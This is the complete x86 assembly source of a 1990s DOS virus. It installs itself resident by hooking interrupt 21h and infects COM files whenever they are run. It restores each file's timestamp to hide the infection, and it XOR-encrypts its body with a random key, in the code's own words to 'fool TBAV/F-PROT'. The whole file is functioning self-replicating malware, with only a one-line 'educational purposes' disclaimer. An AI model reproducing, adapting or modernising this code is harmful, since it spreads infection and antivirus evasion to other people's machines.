;
;	VIRUS03.ASM
;
;	Author: Johan Gardhage <johan.gardhage@gmail.com>
;	Originally written in 1995.
;
; Description:
; This virus is a resident infector of COM files, encrypted with an
; XOR algorithm. It uses BIOS manipulation to install the int21h handler.
;
; The virus infects on execute (4b00h).
;
; Disclaimer:
; I take no responsibility for any damage, either direct or implied,
; caused by the usage of this virus source code or of the resulting code
; after assembly. The code was written for educational purposes ONLY.
;

	.model tiny
	.code
	.startup
	locals @@

VirusSize	equ	EndVirus-BeginVirus
SegmentSize	equ	(EndVirus-BeginVirus+1023)/1024
VirusInterrupt	equ	7979h
VirusHandshake	equ	'JG'
ComMarker	equ	'@'

;---------------------------------------------------------------------
;	The virus begins here
;---------------------------------------------------------------------

BeginVirus:
	jmp	EntryPoint

;---------------------------------------------------------------------
;	Start of encrypted section
;---------------------------------------------------------------------

BeginEncryptedSection:
	mov	ax, VirusInterrupt			; Check if in mem
	int	21h
	cmp	ax, VirusHandshake
	je	AlreadyResident

	mov	ax, es					; Get PSP
	dec	ax					; ax-1 = MCB
	mov	ds, ax					; Get MCB

	sub	word ptr ds:[3], SegmentSize*64		; Change...
	sub	word ptr ds:[12h], SegmentSize*64	; ...allocation
	mov	ax, word ptr ds:[12h]			; Calc usable segment
	sub	ax, 10h					; Compensate org 100h
	mov	es, ax

	push	cs
	pop	ds

	lea	si, [bp+offset BeginVirus]
	mov	di, 100h
	mov	cx, (VirusSize+1)/2			; Bytes to copy
	rep	movsw					; Move it!

	xor	ax, ax
	mov	ds, ax
	sub	word ptr ds:[413h], SegmentSize		; Shrink memory size
	lds	bx, ds:[21h*4]				; Get old int handler
	mov	word ptr es:Int21o, bx			; Save old offset
	mov	word ptr es:Int21s, ds			; Save old segment
	mov	ds, ax
	mov	word ptr ds:[21h*4], offset Int21hHandler	; Replace with new
	mov	word ptr ds:[21h*4+2], es		; in high memory

AlreadyResident:
	mov	di, 100h
	push	di					; Save di at 100h
	push	cs					; Make cs=ds=es
	push	cs
	pop	es
	pop	ds
	lea	si, [bp+OldJmp]
	movsw						; Copy first bytes
	movsw
	ret						; Return

;---------------------------------------------------------------------
;	New int 21h handler
;---------------------------------------------------------------------

Int21hHandler:
	cmp	ax, VirusInterrupt			; Return installation
	jne	@@next
	mov	ax, VirusHandshake
	iret
@@next:	cmp	ax, 4b00h				; Execute?
	je	InfectFileOnExecute

OldInt21h:						; Jump to old int21h
	db	0eah
Int21o	dw	?
Int21s	dw	?

;---------------------------------------------------------------------
;	Infect on execute (4b00h)
;---------------------------------------------------------------------

InfectFileOnExecute:
	push	es bp ax bx cx si di ds dx

	mov	ax, 3d02h				; Open file
	int	21h
	jc	@@done
	xchg	ax, bx

	push	cs					; cs=ds
	pop	ds

	mov	ax, 5700h				; Get time/date
	int	21h
	mov	Time, cx
	mov	Date, dx

	mov	ah, 3fh					; Read first bytes
	mov	cx, 4
	mov	dx, offset OldJmp
	int	21h

	cmp	word ptr OldJmp, 'ZM'			; Check if .EXE file
	je	@@skip					; Don't infect!
	cmp	word ptr OldJmp, 'MZ'
	je	@@skip

	cmp	byte ptr OldJmp+3, ComMarker		; Don't reinfect!
	je	@@skip

	mov	al, 2h					; Go to EOF
	call	SetFilePointer

	cmp	ax, (0ffffh-VirusSize)			; Dont infect too big
	jae	@@skip
	cmp	ax, VirusSize				; or too small files
	jb	@@skip

	add	ax, offset EntryPoint-103h		; Calc entry offset
	mov	word ptr NewJmp[1], ax			; Move it to NewJmp

	call	WriteVirus

	xor	al, al					; Go to SOF
	call	SetFilePointer

	mov	ah, 40h					; Write jmp-construct
	mov	cx, 4
	mov	dx, offset NewJmp
	int	21h

	mov	ax, 5701h				; Restore date/time
	mov	dx, Date
	mov	cx, Time
	int	21h

@@skip:	mov	ah, 3eh					; Close
	int	21h

@@done:	pop	dx ds di si cx bx ax bp es

	jmp	OldInt21h

NewJmp	db	0e9h, 00h, 00h, ComMarker		; New entry buffer
OldJmp	db	0cdh, 20h, 00h, 00h			; 4 byte buffer

Time	dw	0
Date	dw	0

;---------------------------------------------------------------------
;	Helper functions
;---------------------------------------------------------------------

SetFilePointer:
	mov	ah, 42h					; Jump in file
	xor	cx, cx
	cwd
	int	21h
	ret

WriteVirus:
@@loop:	mov	ah, 2ch					; Get random number
	int	21h
	or	dl, dl					; dl=0 - get another value!
	je	@@loop
	mov	word ptr ds:[Key], dx

	mov	ax, 08d00h				; Copy virus to 8d00h:100h
	mov	es, ax
	mov	di, 100h
	mov	si, di
	mov	cx, (VirusSize+1)/2
	rep	movsw
	push	es
	pop	ds
	xor	bp, bp					; And encrypt it there
	call	EncryptDecrypt

	mov	ah, 40h					; Write virus to file
	mov	cx, VirusSize
	mov	dx, offset BeginVirus
	int	21h

	push	cs					; cs=ds
	pop	ds
	ret

EndEncryptedSection:

;---------------------------------------------------------------------
;	End of encrypted section
;---------------------------------------------------------------------

EntryPoint:
	push	ax
	pop	ax
	push	ax
	pop	ax
	call	GetDelta
EncryptDecrypt:
	mov	dx, word ptr ds:[bp+Key]		; routine here to
	lea	si, [bp+BeginEncryptedSection]		; fool TBAV/F-PROT
	mov	cx, (EndEncryptedSection-BeginEncryptedSection)/2
@@loop:	xor	word ptr ds:[si], dx			; Simple xor-loop
	inc	si					; encryption
	inc	si
	loop	@@loop
	ret
Key	dw	0					; en/decrypt value
GetDelta:
	pop	bp
	sub	bp, offset EncryptDecrypt		; Get delta offset
	call	EncryptDecrypt				; Decrypt virus
	jmp	BeginEncryptedSection

EndVirus:

end
